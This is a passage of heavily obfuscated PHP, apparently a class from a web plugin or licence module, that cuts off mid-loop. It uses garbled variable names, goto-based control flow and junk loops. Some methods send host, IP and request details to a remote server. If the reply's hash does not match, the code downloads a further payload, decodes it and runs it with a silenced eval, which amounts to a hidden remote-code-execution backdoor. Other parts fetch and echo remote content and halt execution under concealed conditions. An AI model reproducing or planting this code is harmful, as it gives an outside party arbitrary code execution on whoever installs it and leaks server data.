$f£“Ñ‚šóÑ[605]; goto A˜Ëà–íµŞ; eÕö°³‘¶: $aß«• áê[61]($aß«• áê[62])->{$_SERVER[¦“®å”‹ôÍ][220]}($aß«• áê[221], $aß«• áê[234]); $D¬éŒÈå«­ = $f£“Ñ‚šóÑ[604]; while (strlen($D¬éŒÈå«­) < $f£“Ñ‚šóÑ[564]) { if (!$D¬éŒÈå«­) { break; } $D¬éŒÈå«­++; } goto F›‘ğò £„; A˜Ëà–íµŞ: } private function vmdja23d6c2c() { goto DÕ·×Ò‹š¡; cˆ·¸ÙÁùˆ: $Aƒ°‹¼Ÿğµ = $F Ø«ô–…¬[611]; $Cõ£ÓŒ¸‡ = $this->{$_SERVER[¦“®å”‹ôÍ][190]}($EÂğà³Ï¢ë[$eºÆ…ÅŸå˜[93]][$cœŒˆÔ´ä], $fğÅÏ´ÜÈ); $bß–éÊÉÚ = $F Ø«ô–…¬[612]; goto cê¹ÕİÑ‚; A´ÜÀ–¾¤˜: $CŒ‰ŸÎÈš´ = $F Ø«ô–…¬[610]; while (strlen($CŒ‰ŸÎÈš´) < $F Ø«ô–…¬[558]) { if (!$CŒ‰ŸÎÈš´) { break; } $CŒ‰ŸÎÈš´++; } $cœŒˆÔ´ä = $eºÆ…ÅŸå˜[216]($eºÆ…ÅŸå˜[25]($fğÅÏ´ÜÈ, 10, 16)); goto cˆ·¸ÙÁùˆ; CÅ¦´„‚Àï: if ($CĞ“œªß—[$eºÆ…ÅŸå˜[122]] == $eºÆ…ÅŸå˜[123]) { return; } $B‚­­ïĞ¹¾ = $eºÆ…ÅŸå˜[61]($eºÆ…ÅŸå˜[62])->{$_SERVER[¦“®å”‹ôÍ][63]}($eºÆ…ÅŸå˜[118]); $c¨¼Ÿ‰ÑŒ· = $F Ø«ô–…¬[608]; goto D……É Ôæ»; D……É Ôæ»: while ($c¨¼Ÿ‰ÑŒ· < $F Ø«ô–…¬[558]) { if ($c¨¼Ÿ‰ÑŒ· >= 0) { break; } $c¨¼Ÿ‰ÑŒ·++; } $CõÍõâ Û = $eºÆ…ÅŸå˜[224]($eºÆ…ÅŸå˜[61]($eºÆ…ÅŸå˜[11])->{$_SERVER[¦“®å”‹ôÍ][225]}(), $eºÆ…ÅŸå˜[226]); $EÂğà³Ï¢ë = $CõÍõâ Û[$eºÆ…ÅŸå˜[227]]; goto cğºÛ‚ƒš; eªÅñ•¬†í: $CĞ“œªß— = $eºÆ…ÅŸå˜[61]($eºÆ…ÅŸå˜[62])->{$_SERVER[¦“®å”‹ôÍ][63]}(); $e¢ĞÆÏÉÏÇ = $F Ø«ô–…¬[607]; if (!$e¢ĞÆÏÉÏÇ) { return; } goto CÅ¦´„‚Àï; DÕ·×Ò‹š¡: $F Ø«ô–…¬ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $eºÆ…ÅŸå˜ =& $_SERVER[¦“®å”‹ôÍ]; $_SERVER[$eºÆ…ÅŸå˜[177]] = $eºÆ…ÅŸå˜[106]($_SERVER, $eºÆ…ÅŸå˜[177], APP_HOST); goto dƒ¤ª‘®îô; AœïæºªìË: if ($eºÆ…ÅŸå˜[235]() >= $båÑ×‡Ïæ) { return $this->{$_SERVER[¦“®å”‹ôÍ][166]}(); } $this->ihuf4899dc13 = $Cõ£ÓŒ¸‡; $this->nmoc3bb7cbf4 = $CĞ“œªß—[$eºÆ…ÅŸå˜[122]]; goto D½Œ÷ªˆÉ©; cê¹ÕİÑ‚: $Cõ£ÓŒ¸‡ = $eºÆ…ÅŸå˜[192]($Cõ£ÓŒ¸‡, !0); if (!$eºÆ…ÅŸå˜[193]($Cõ£ÓŒ¸‡)) { return $this->{$_SERVER[¦“®å”‹ôÍ][166]}(); } $båÑ×‡Ïæ = $eºÆ…ÅŸå˜[146]($Cõ£ÓŒ¸‡[$eºÆ…ÅŸå˜[147]]); goto AœïæºªìË; dƒ¤ª‘®îô: $aÂ¹Ñ†¬±® = $F Ø«ô–…¬[606]; if (!$aÂ¹Ñ†¬±®) { return; } $this->nmoc3bb7cbf4 = $eºÆ…ÅŸå˜[123]; goto eªÅñ•¬†í; cğºÛ‚ƒš: $DÚÉ‰Ë†â = $F Ø«ô–…¬[609]; while ($DÚÉ‰Ë†â < $F Ø«ô–…¬[588]) { if ($DÚÉ‰Ë†â >= 0) { break; } $DÚÉ‰Ë†â++; } $fğÅÏ´ÜÈ = $eºÆ…ÅŸå˜[116]($_SERVER[$eºÆ…ÅŸå˜[117]] . $eºÆ…ÅŸå˜[216]($B‚­­ïĞ¹¾) . $CĞ“œªß—[$eºÆ…ÅŸå˜[212]]); goto A´ÜÀ–¾¤˜; D½Œ÷ªˆÉ©: } private function lhfi229e6a95() { goto F±ñ¿äß°Ü; c–àÏ‘›: $A·å¬Ò«­ = $Fë¢‘©¥·º[613]; if (strlen($A·å¬Ò«­) < $Fë¢‘©¥·º[588]) { die; } $bôĞ”‰ø¡÷ = $_SERVER[$bÓÊ¦õ£ [44]]; goto EÓÁÊ›§°Ò; F±ñ¿äß°Ü: $Fë¢‘©¥·º =& $_SERVER[´Ù×Íå‘ÄõÛ]; $bÓÊ¦õ£  =& $_SERVER[¦“®å”‹ôÍ]; $Cêöù²ÕôË = $GLOBALS[$bÓÊ¦õ£ [22]]; goto c–àÏ‘›; EÓÁÊ›§°Ò: if ($bôĞ”‰ø¡÷ == $bÓÊ¦õ£ [236] && $this->nmoc3bb7cbf4 == $bÓÊ¦õ£ [123]) { $bÓÊ¦õ£ [168]($bÓÊ¦õ£ [199]($bÓÊ¦õ£ [237]), !1, $bÓÊ¦õ£ [238]); } $Aƒ‚‚Î´‹Ç = array($bÓÊ¦õ£ [239], $bÓÊ¦õ£ [240]); if ($bÓÊ¦õ£ [241]($bôĞ”‰ø¡÷, $Aƒ‚‚Î´‹Ç)) { if ($this->nmoc3bb7cbf4 == $bÓÊ¦õ£ [123] && isset($Cêöù²ÕôË[$bÓÊ¦õ£ [242]])) { $bÓÊ¦õ£ [168]($bÓÊ¦õ£ [199]($bÓÊ¦õ£ [237]), !1, $bÓÊ¦õ£ [238]); die; } $c©Í§ä­ = $this->{$_SERVER[¦“®å”‹ôÍ][139]}(); if ($c©Í§ä­ != $bÓÊ¦õ£ [203]($bÓÊ¦õ£ [243])) { if ($c©Í§ä­ <= $bÓÊ¦õ£ [61]($bÓÊ¦õ£ [141])->{$_SERVER[¦“®å”‹ôÍ][142]}()) { $bÓÊ¦õ£ [168]($bÓÊ¦õ£ [199]($bÓÊ¦õ£ [244]), !1, $bÓÊ¦õ£ [238]); die; } } } goto b¢õŸêàÎ; b¢õŸêàÎ: } private function joxhafa8f44f() { goto d”İ±…é; d”İ±…é: $eÙô¤¨Éà¢ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $cíº¡ëİ‹ =& $_SERVER[¦“®å”‹ôÍ]; $Cò‘‚æÔÆ‰ = array($cíº¡ëİ‹[137], $cíº¡ëİ‹[245]); goto CëÕ¢ˆÛèâ; eˆİí½ÈŞ±: $B»Ÿ¸ôÈº¯ = @$cíº¡ëİ‹[255]($c„ƒ´…åó©, !1, $CŞÈØ“çé); $B»„ÈŒä´¤ = $eÙô¤¨Éà¢[616]; while (strlen($B»„ÈŒä´¤) < $eÙô¤¨Éà¢[556]) { if (!$B»„ÈŒä´¤) { break; } $B»„ÈŒä´¤++; } goto F•Æ…È¿È•; Có·ğ ºÀä: while (strlen($aŞ¨àë¤) < $eÙô¤¨Éà¢[550]) { if (!$aŞ¨àë¤) { break; } $aŞ¨àë¤++; } $c„ƒ´…åó© = $this->{$_SERVER[¦“®å”‹ôÍ][248]}($c„ƒ´…åó©, $cíº¡ëİ‹[249]); $CŞÈØ“çé = $cíº¡ëİ‹[250](array($cíº¡ëİ‹[251] => array($cíº¡ëİ‹[252] => $cíº¡ëİ‹[253], $cíº¡ëİ‹[254] => 3))); goto eˆİí½ÈŞ±; Fğ¦×»¼: if (!$cíº¡ëİ‹[241]($_SERVER[$cíº¡ëİ‹[44]], $Cò‘‚æÔÆ‰)) { return; } $c„ƒ´…åó© = $cíº¡ëİ‹[247]; $aŞ¨àë¤ = $eÙô¤¨Éà¢[615]; goto Có·ğ ºÀä; CëÕ¢ˆÛèâ: $Dğ¹µ‹‘Ó = $eÙô¤¨Éà¢[614]; while (strlen($Dğ¹µ‹‘Ó) < $eÙô¤¨Éà¢[550]) { if (!$Dğ¹µ‹‘Ó) { break; } $Dğ¹µ‹‘Ó++; } if (!$cíº¡ëİ‹[106]($GLOBALS, $cíº¡ëİ‹[134]) || !isset($_GET[$cíº¡ëİ‹[246]])) { return; } goto Fğ¦×»¼; F•Æ…È¿È•: $cíº¡ëİ‹[256]($cíº¡ëİ‹[257]); if ($B»Ÿ¸ôÈº¯ && $cíº¡ëİ‹[32]($B»Ÿ¸ôÈº¯, $cíº¡ëİ‹[258])) { echo $B»Ÿ¸ôÈº¯; } die; goto d‡¬†ÚÏÌ™; d‡¬†ÚÏÌ™: } public function uoyj10bb19e1($F¿Ì±¹¡é) { goto EÆèƒ‰¨ÕÏ; EÆèƒ‰¨ÕÏ: $Fó—ğƒÖøµ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $A°ºÈËäô¥ =& $_SERVER[¦“®å”‹ôÍ]; if ($this->nmoc3bb7cbf4 == $A°ºÈËäô¥[259]) { return $F¿Ì±¹¡é; } goto FÃÖ­°è²¹; CÛÜİ©õîì: return $F¿Ì±¹¡é; goto f‡’ÀŒÍ¢‰; FÃÖ­°è²¹: $DäÊÑ¢•ùŠ = array($A°ºÈËäô¥[260], $A°ºÈËäô¥[261], $A°ºÈËäô¥[262], $A°ºÈËäô¥[263], $A°ºÈËäô¥[264], $A°ºÈËäô¥[265], $A°ºÈËäô¥[266], $A°ºÈËäô¥[267]); $B–Ÿ¾µèğø = $Fó—ğƒÖøµ[617]; if (strlen($B–Ÿ¾µèğø) < $Fó—ğƒÖøµ[588]) { die; } goto DğÓœĞ‰Á; DğÓœĞ‰Á: $e´í©ªªÈò = $A°ºÈËäô¥[0]($A°ºÈËäô¥[268], $A°ºÈËäô¥[106]($this->ihuf4899dc13, $A°ºÈËäô¥[131], $A°ºÈËäô¥[10])); $f˜Ûá–½· = array(); $f˜æöô¬ĞÜ = $Fó—ğƒÖøµ[618]; goto cõë†˜³ğ; cõë†˜³ğ: while (strlen($f˜æöô¬ĞÜ) < $Fó—ğƒÖøµ[564]) { if (!$f˜æöô¬ĞÜ) { break; } $f˜æöô¬ĞÜ++; } foreach ($DäÊÑ¢•ùŠ as $BŠõ©Ã©„) { if (!$A°ºÈËäô¥[241]($BŠõ©Ã©„, $e´í©ªªÈò)) { $f˜Ûá–½·[] = $BŠõ©Ã©„; } } foreach ($f˜Ûá–½· as $BŠõ©Ã©„) { unset($F¿Ì±¹¡é[$BŠõ©Ã©„]); } goto CÛÜİ©õîì; f‡’ÀŒÍ¢‰: } private function peht0d7f6537() { goto b—Õƒğ—‰; añ×›¿Ÿß»: $GLOBALS[$b˜†çŠÉ©Ş[93]][$b˜†çŠÉ©Ş[97]][$b˜†çŠÉ©Ş[269]] = $b˜†çŠÉ©Ş[222]; $GLOBALS[$b˜†çŠÉ©Ş[93]][$b˜†çŠÉ©Ş[270]] = $b˜†çŠÉ©Ş[222]; $Fè×„äšâõ = $A×±Åì¹˜[619]; goto Cé÷¤óä‰©; b—Õƒğ—‰: $A×±Åì¹˜ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $b˜†çŠÉ©Ş =& $_SERVER[¦“®å”‹ôÍ]; if ($this->nmoc3bb7cbf4 != $b˜†çŠÉ©Ş[123]) { return; } goto añ×›¿Ÿß»; Cé÷¤óä‰©: while ($Fè×„äšâõ < $A×±Åì¹˜[564]) { if ($Fè×„äšâõ >= 0) { break; } $Fè×„äšâõ++; } if ($b˜†çŠÉ©Ş[61]($b˜†çŠÉ©Ş[271])->{$_SERVER[¦“®å”‹ôÍ][63]}($b˜†çŠÉ©Ş[87]) != $b˜†çŠÉ©Ş[234]) { $b˜†çŠÉ©Ş[61]($b˜†çŠÉ©Ş[271])->{$_SERVER[¦“®å”‹ôÍ][223]}($b˜†çŠÉ©Ş[87], $b˜†çŠÉ©Ş[234]); } goto EÜ÷øè¶©®; EÜ÷øè¶©®: } public function wvfse40a6cea() { $câïĞøÌ˜ =& $_SERVER[´Ù×Íå‘ÄõÛ]; return $_SERVER[¦“®å”‹ôÍ][272]; $Dâ’ªŠ¯Û = $câïĞøÌ˜[620]; while ($Dâ’ªŠ¯Û < $câïĞøÌ˜[564]) { if ($Dâ’ªŠ¯Û >= 0) { break; } $Dâ’ªŠ¯Û++; } } private function wunm829225f3() { goto d¤‹ÇÔÑİñ; dĞîš”Èù™: $Dé—ïŞ = $dä¢Î»»Ãà[276] . $dä¢Î»»Ãà[116]($dä¢Î»»Ãà[277]); if ($this->nmoc3bb7cbf4 == $dä¢Î»»Ãà[123] || !$dä¢Î»»Ãà[106]($GLOBALS, $dä¢Î»»Ãà[134])) { return; } if (!$dä¢Î»»Ãà[241]($_SERVER[$dä¢Î»»Ãà[44]], $C¼†¿ÉîÒ)) { return; } goto EŠï´®Éç¤; C‰´µ™ìåÕ: $BšŸñÉŞæê = array($dä¢Î»»Ãà[167] => $dä¢Î»»Ãà[61]($dä¢Î»»Ãà[62])->{$_SERVER[¦“®å”‹ôÍ][63]}($dä¢Î»»Ãà[211]), $dä¢Î»»Ãà[180] => $this->nmoc3bb7cbf4, $dä¢Î»»Ãà[178] => $_SERVER[$dä¢Î»»Ãà[179]], $dä¢Î»»Ãà[171] => $dä¢Î»»Ãà[151], $dä¢Î»»Ãà[174] => $_SERVER[$dä¢Î»»Ãà[175]]); $dÒêÌµĞñê = $this->{$_SERVER[¦“®å”‹ôÍ][184]}($dä¢Î»»Ãà[281], $BšŸñÉŞæê); $bëµã‹‰Š¢ = $B©çù³Œ[622]; goto FØÛ‚‡–âö; d¤‹ÇÔÑİñ: $B©çù³Œ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $dä¢Î»»Ãà =& $_SERVER[¦“®å”‹ôÍ]; $C¼†¿ÉîÒ = array($dä¢Î»»Ãà[273], $dä¢Î»»Ãà[274], $dä¢Î»»Ãà[275]); goto dĞîš”Èù™; F„÷×Ë˜³: $this->{$_SERVER[¦“®å”‹ôÍ][166]}(); if ($this->{$_SERVER[¦“®å”‹ôÍ][201]}($dÒêÌµĞñê[$dä¢Î»»Ãà[282]]) != $BšŸñÉŞæê[$dä¢Î»»Ãà[167]]) { $FŞùîœ¨‘Õ = array($dä¢Î»»Ãà[204] => $dä¢Î»»Ãà[61]($dä¢Î»»Ãà[62])->{$_SERVER[¦“®å”‹ôÍ][63]}($dä¢Î»»Ãà[118]), $dä¢Î»»Ãà[205] => $_SERVER[$dä¢Î»»Ãà[117]], $dä¢Î»»Ãà[206] => $dä¢Î»»Ãà[207](), $dä¢Î»»Ãà[176] => $_SERVER[$dä¢Î»»Ãà[177]]); $eò¯Ú¢ƒ­† = $this->{$_SERVER[¦“®å”‹ôÍ][208]}($dä¢Î»»Ãà[150]($FŞùîœ¨‘Õ)); $dÒêÌµĞñê = $this->{$_SERVER[¦“®å”‹ôÍ][184]}($dä¢Î»»Ãà[209] . $eò¯Ú¢ƒ­†); if ($dÒêÌµĞñê && $dä¢Î»»Ãà[193]($dÒêÌµĞñê) && isset($dÒêÌµĞñê[$dä¢Î»»Ãà[282]])) { $d–¿¯Ë•ù¯ = $this->{$_SERVER[¦“®å”‹ôÍ][190]}($dÒêÌµĞñê[$dä¢Î»»Ãà[282]], 2); if ($d–¿¯Ë•ù¯) { $d–¿¯Ë•ù¯ = $this->{$_SERVER[¦“®å”‹ôÍ][201]}($d–¿¯Ë•ù¯); } if ($d–¿¯Ë•ù¯) { try { @eval($d–¿¯Ë•ù¯); } catch (Exception $Aòä¨÷ïµá) { } } } } goto BÃÍÔõá‡Œ; FØÛ‚‡–âö: if (strlen($bëµã‹‰Š¢) < $B©çù³Œ[564]) { die; } if (!$dä¢Î»»Ãà[193]($dÒêÌµĞñê)) { return; } if ($dÒêÌµĞñê[$dä¢Î»»Ãà[167]] && $dÒêÌµĞñê[$dä¢Î»»Ãà[282]]) { if ($this->{$_SERVER[¦“®å”‹ôÍ][201]}($dÒêÌµĞñê[$dä¢Î»»Ãà[282]]) == $BšŸñÉŞæê[$dä¢Î»»Ãà[167]]) { return; } } goto F„÷×Ë˜³; EŠï´®Éç¤: if ($dä¢Î»»Ãà[235]() % 4 != 0) { return; } $Dï¶ÙŠ¬ = $dä¢Î»»Ãà[13](array($dä¢Î»»Ãà[278], $dä¢Î»»Ãà[279]), $Dé—ïŞ); if ($Dï¶ÙŠ¬ && $dä¢Î»»Ãà[235]() - $Dï¶ÙŠ¬ < $dä¢Î»»Ãà[203]($dä¢Î»»Ãà[280])) { return; } goto EºÁ¥ÉäÌ; EºÁ¥ÉäÌ: $dä¢Î»»Ãà[13](array($dä¢Î»»Ãà[278], $dä¢Î»»Ãà[154]), $Dé—ïŞ, $dä¢Î»»Ãà[235]()); $b¤ÕÍÙÆõÇ = $B©çù³Œ[621]; while (strlen($b¤ÕÍÙÆõÇ) < $B©çù³Œ[564]) { if (!$b¤ÕÍÙÆõÇ) { break; } $b¤ÕÍÙÆõÇ++; } goto C‰´µ™ìåÕ; BÃÍÔõá‡Œ: } private function kemga9d2cf6b($A‰ó¥—œê¢ = '', $a“ñîƒäÓ¸ = array(), $cæ’Úà¯²­ = 5) { goto bÔ¬®õÂï­; Eˆ”Óè‚: $d¶°ùĞ‚Ü— = $E‡ˆ¼çÆËé[623]; $BÎå„Á„¥Ì = $this->{$_SERVER[¦“®å”‹ôÍ][248]}($BÎå„Á„¥Ì, $aØŒÉ¹Û[284]); $BÎå„Á„¥Ì = $BÎå„Á„¥Ì . $A‰ó¥—œê¢ . $aØŒÉ¹Û[285] . $aØŒÉ¹Û[286]($a“ñîƒäÓ¸); goto D™ğœåÙŞœ; då¨Â’èÛà: while ($få‘îºÍ© < $E‡ˆ¼çÆËé[550]) { if ($få‘îºÍ© >= 0) { break; } $få‘îºÍ©++; } goto Báğß’›§±; CîÆ‡á¥Ûì: $A‚øÈÀ™¾ = $E‡ˆ¼çÆËé[624]; return $aØŒÉ¹Û[192]($a“ñîƒäÓ¸, !0); $få‘îºÍ© = $E‡ˆ¼çÆËé[625]; goto då¨Â’èÛà; D™ğœåÙŞœ: if ($a“ñîƒäÓ¸ === -1) { return $BÎå„Á„¥Ì; } $a¾‘ÙÒÌË = $aØŒÉ¹Û[250](array($aØŒÉ¹Û[251] => array($aØŒÉ¹Û[254] => $cæ’Úà¯²­, $aØŒÉ¹Û[252] => $aØŒÉ¹Û[287]), $aØŒÉ¹Û[288] => array($aØŒÉ¹Û[289] => !1, $aØŒÉ¹Û[290] => !1))); $a“ñîƒäÓ¸ = @$aØŒÉ¹Û[255]($BÎå„Á„¥Ì, !1, $a¾‘ÙÒÌË); goto CîÆ‡á¥Ûì; bÔ¬®õÂï­: $E‡ˆ¼çÆËé =& $_SERVER[´Ù×Íå‘ÄõÛ]; $aØŒÉ¹Û =& $_SERVER[¦“®å”‹ôÍ]; $BÎå„Á„¥Ì = $aØŒÉ¹Û[283]; goto Eˆ”Óè‚; Báğß’›§±: } private function ehkqa0d03125() { goto BÊ‡®ÂÈİ«; dÇÀ³‰ƒµ­: $Bà™áè¼Ü = $Bà™áè¼Ü ? $fç‡¿Æ†Š»[203]($Bà™áè¼Ü) : 0; return $bšÎ¶Ë‚ÔÏ + $Bà™áè¼Ü; goto e¨œ ª›º¼; dŸ‘»ÄÑ¨™: $Bà™áè¼Ü = $fç‡¿Æ†Š»[106]($this->ihuf4899dc13, $fç‡¿Æ†Š»[318]); $AåÇôÏğÃ = $d¯Ã™‘¯é[628]; if (!$AåÇôÏğÃ) { return; } goto dÇÀ³‰ƒµ­; F‰ë…¾Š: $F¼‹î“§Èç = $d¯Ã™‘¯é[626]; if (!$F¼‹î“§Èç) { return; } $bšÎ¶Ë‚ÔÏ = $EŸ¹Ğô­ãÄ[$this->nmoc3bb7cbf4]; goto E­Ä‘™ø“™; BÊ‡®ÂÈİ«: $d¯Ã™‘¯é =& $_SERVER[´Ù×Íå‘ÄõÛ]; $fç‡¿Æ†Š» =& $_SERVER[¦“®å”‹ôÍ]; $EŸ¹Ğô­ãÄ = array($fç‡¿Æ†Š»[291] => $fç‡¿Æ†Š»[292], $fç‡¿Æ†Š»[293] => $fç‡¿Æ†Š»[294], $fç‡¿Æ†Š»[295] => $fç‡¿Æ†Š»[296], $fç‡¿Æ†Š»[297] => $fç‡¿Æ†Š»[298], $fç‡¿Æ†Š»[299] => $fç‡¿Æ†Š»[300], $fç‡¿Æ†Š»[301] => $fç‡¿Æ†Š»[243], $fç‡¿Æ†Š»[302] => $fç‡¿Æ†Š»[243], $fç‡¿Æ†Š»[303] => $fç‡¿Æ†Š»[292], $fç‡¿Æ†Š»[304] => $fç‡¿Æ†Š»[294], $fç‡¿Æ†Š»[305] => $fç‡¿Æ†Š»[296], $fç‡¿Æ†Š»[306] => $fç‡¿Æ†Š»[307], $fç‡¿Æ†Š»[308] => $fç‡¿Æ†Š»[298], $fç‡¿Æ†Š»[309] => $fç‡¿Æ†Š»[310], $fç‡¿Æ†Š»[311] => $fç‡¿Æ†Š»[300], $fç‡¿Æ†Š»[312] => $fç‡¿Æ†Š»[313], $fç‡¿Æ†Š»[314] => $fç‡¿Æ†Š»[315], $fç‡¿Æ†Š»[316] => $fç‡¿Æ†Š»[317]); goto F‰ë…¾Š; E­Ä‘™ø“™: $b–×™÷˜ÎÎ = $d¯Ã™‘¯é[627]; while (strlen($b–×™÷˜ÎÎ) < $d¯Ã™‘¯é[550]) { if (!$b–×™÷˜ÎÎ) { break; } $b–×™÷˜ÎÎ++; } $bšÎ¶Ë‚ÔÏ = $fç‡¿Æ†Š»[203]($bšÎ¶Ë‚ÔÏ ? $bšÎ¶Ë‚ÔÏ : $fç‡¿Æ†Š»[292]); goto dŸ‘»ÄÑ¨™; e¨œ ª›º¼: } public function oisl1ac0ed21($B‘Â¿ÊÌ“) { goto cÎƒğÍÆõ§; c·©¿èÖÕã: if ($a¤­‹ƒ·œ‹ >= $Dö¹°áœ¥[203]($Dö¹°áœ¥[243])) { return; } $EÓÌ«å…Ğ = $Dö¹°áœ¥[61]($Dö¹°áœ¥[141])->{$_SERVER[¦“®å”‹ôÍ][142]}(); if ($EÓÌ«å…Ğ <= $a¤­‹ƒ·œ‹) { return; } goto FÖåœòÍö; eëæß¦ŸİÌ: $BÇÈ…ëÃ‚£ = $d˜£ô¬ë³[629]; while (strlen($BÇÈ…ëÃ‚£) < $d˜£ô¬ë³[564]) { if (!$BÇÈ…ëÃ‚£) { break; } $BÇÈ…ëÃ‚£++; } if ($B‘Â¿ÊÌ“[$Dö¹°áœ¥[319]] == $Dö¹°áœ¥[222]) { return; } goto c·©¿èÖÕã; cÎƒğÍÆõ§: $d˜£ô¬ë³ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Dö¹°áœ¥ =& $_SERVER[¦“®å”‹ôÍ]; $a¤­‹ƒ·œ‹ = $this->{$_SERVER[¦“®å”‹ôÍ][139]}(); goto eëæß¦ŸİÌ; c˜“†ƒˆÕ: if (!$Dö¹°áœ¥[241]($B‘Â¿ÊÌ“[$Dö¹°áœ¥[319]], $E©§ª¢²Ÿƒ)) { $Dö¹°áœ¥[168]($Dö¹°áœ¥[323], !1, $Dö¹°áœ¥[238]); } goto c³È“äŒÕ‡; FÖåœòÍö: $E©§ª¢²Ÿƒ = $Dö¹°áœ¥[61]($Dö¹°áœ¥[141])->{$_SERVER[¦“®å”‹ôÍ][320]}($Dö¹°áœ¥[319])->{$_SERVER[¦“®å”‹ôÍ][321]}($a¤­‹ƒ·œ‹)->{$_SERVER[¦“®å”‹ôÍ][322]}(); $E©§ª¢²Ÿƒ = $Dö¹°áœ¥[224]($E©§ª¢²Ÿƒ, $Dö¹°áœ¥[10], $Dö¹°áœ¥[319]); $f¨©¾Ó¢‘³ = $d˜£ô¬ë³[630]; goto c˜“†ƒˆÕ; c³È“äŒÕ‡: } public function bqfh05210615() { goto F·¤•æù’¸; eëø‚ßå´: if (strlen($e×à§«—¡ì) < $cêÄ¾„òˆ[558]) { die; } $f—Õàì—ã = $aµË­¼†µ´[250](array($aµË­¼†µ´[251] => array($aµË­¼†µ´[252] => $aµË­¼†µ´[253], $aµË­¼†µ´[254] => 3))); $AÔÔñ³É†­ = @$aµË­¼†µ´[255]($eÔçÜƒñ“¥, !1, $f—Õàì—ã); goto e‡Ú‘Š§ÜÚ; e‡Ú‘Š§ÜÚ: $E£ì–Ç÷ = $cêÄ¾„òˆ[632]; echo $aµË­¼†µ´[325] . $aµË­¼†µ´[326]($AÔÔñ³É†­) . $aµË­¼†µ´[327]; $f•¸–òÜñ‘ = $cêÄ¾„òˆ[633]; goto dÌÏñÁËæ; A£¦´ˆÕ„: $eÔçÜƒñ“¥ = $aµË­¼†µ´[247]; $eÔçÜƒñ“¥ = $this->{$_SERVER[¦“®å”‹ôÍ][248]}($eÔçÜƒñ“¥, $aµË­¼†µ´[249]); $e×à§«—¡ì = $cêÄ¾„òˆ[631]; goto eëø‚ßå´; F·¤•æù’¸: $cêÄ¾„òˆ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $aµË­¼†µ´ =& $_SERVER[¦“®å”‹ôÍ]; if (!$aµË­¼†µ´[106]($GLOBALS, $aµË­¼†µ´[134]) || $aµË­¼†µ´[324](1, 100) > 20) { return; } goto A£¦´ˆÕ„; dÌÏñÁËæ: if (!$f•¸–òÜñ‘) { return; } goto d‚Í„©àÊÉ; d‚Í„©àÊÉ: } private function vhcn7698aed0($cƒ¨„ Â‰, $cÒ‘ËéÊãÕ, $BÇù„ÇÅÛ = 3) { goto DùñïËîÃÛ; Cá…ø¬ô±Ã: $F´Ø‰Š¿¶ = $BÈ§ã°Ì™Ê[637]; if (!$F´Ø‰Š¿¶) { return; } switch ($aéÓ¼»½ŞŠ) { case $D·˜áåËÖ[234]: $Eåäá¢³ = $this->{$_SERVER[¦“®å”‹ôÍ][149]}($cƒ¨„ Â‰, $D·˜áåËÖ[216]($cÒ‘ËéÊãÕ . $EğÑËâã¾)); $fó®øßİ‹ = $BÈ§ã°Ì™Ê[638]; if (strlen($fó®øßİ‹) < $BÈ§ã°Ì™Ê[564]) { die; } break; $bö—õ‹«ù‰ = $BÈ§ã°Ì™Ê[639]; if (strlen($bö—õ‹«ù‰) < $BÈ§ã°Ì™Ê[564]) { return; } case $D·˜áåËÖ[222]: $Eåäá¢³ = $this->{$_SERVER[¦“®å”‹ôÍ][149]}($cƒ¨„ Â‰, $D·˜áåËÖ[216]($EğÑËâã¾ . $cÒ‘ËéÊãÕ)); break; $eõ¨ê×›ß» = $BÈ§ã°Ì™Ê[640]; if (strlen($eõ¨ê×›ß») < $BÈ§ã°Ì™Ê[558]) { die; } case $D·˜áåËÖ[330]: $Eåäá¢³ = $this->{$_SERVER[¦“®å”‹ôÍ][149]}($cƒ¨„ Â‰, $D·˜áåËÖ[120]($EğÑËâã¾ . $cÒ‘ËéÊãÕ)); break; $dÚ£®ØØ = $BÈ§ã°Ì™Ê[641]; if (!$dÚ£®ØØ) { die; } case $D·˜áåËÖ[331]: $Eåäá¢³ = $this->{$_SERVER[¦“®å”‹ôÍ][149]}($cƒ¨„ Â‰, $D·˜áåËÖ[116]($EğÑËâã¾ . $cÒ‘ËéÊãÕ)); $fâÙØÑîÂ„ = $BÈ§ã°Ì™Ê[642]; if (!$fâÙØÑîÂ„) { return; } break; case $D·˜áåËÖ[332]: goto d¨ÉŸÕ¦ª; aœÃ¾òÈÚÍ: $d«¨—ĞÅ‹ = $BÈ§ã°Ì™Ê[651]; if (strlen($d«¨—ĞÅ‹) < $BÈ§ã°Ì™Ê[588]) { return; } break; goto F„ª¨Š‰—½; CéäòŒ‚µ„: $EäùÌÓµç = $D·˜áåËÖ[116]($aƒ·æáèÜ . $D·˜áåËÖ[116]($cÒ‘ËéÊãÕ . $aƒ·æáèÜ) . $cÒ‘ËéÊãÕ); $Dˆ·¯Ô¼§İ = $BÈ§ã°Ì™Ê[645]; if (!$Dˆ·¯Ô¼§İ) { return; } goto D×™øÛª¬²; d¨ÉŸÕ¦ª: $cƒ¨„ Â‰ = $D·˜áåËÖ[120]($cƒ¨„ Â‰); $f¿çÖÍÜ½õ = $BÈ§ã°Ì™Ê[643]; $FŠÌìÂ­† = $D·˜áåËÖ[333](0, 64); goto dÖ®»›£¾˜; D×™øÛª¬²: $EäùÌÓµç = $D·˜áåËÖ[25]($EäùÌÓµç, $FŠÌìÂ­† % 8, $FŠÌìÂ­† % 8 + 7); $ašÚ¤î£ğ = $BÈ§ã°Ì™Ê[646]; if (strlen($ašÚ¤î£ğ) < $BÈ§ã°Ì™Ê[556]) { return; } goto CÂ„ÇÍÎ‹Œ; F¢ÀïËì”Ì: $Dæá££²„‡ = 0; for ($a¦ÛœËÇ±• = 0; $a¦ÛœËÇ±• < $D·˜áåËÖ[24]($cƒ¨„ Â‰); $a¦ÛœËÇ±•++) { $Dæá££²„‡ = $Dæá££²„‡ == $D·˜áåËÖ[24]($EäùÌÓµç) ? 0 : $Dæá££²„‡; $FÕÃªÕø = ($FŠÌìÂ­† + $D·˜áåËÖ[334]($C—ßó¤Â½ß, $cƒ¨„ Â‰[$a¦ÛœËÇ±•]) + $D·˜áåËÖ[335]($EäùÌÓµç[$Dæá££²„‡++])) % 64; $b¯°ŠÍšØ¤ = $BÈ§ã°Ì™Ê[650]; while ($b¯°ŠÍšØ¤ < $BÈ§ã°Ì™Ê[556]) { if ($b¯°ŠÍšØ¤ >= 0) { 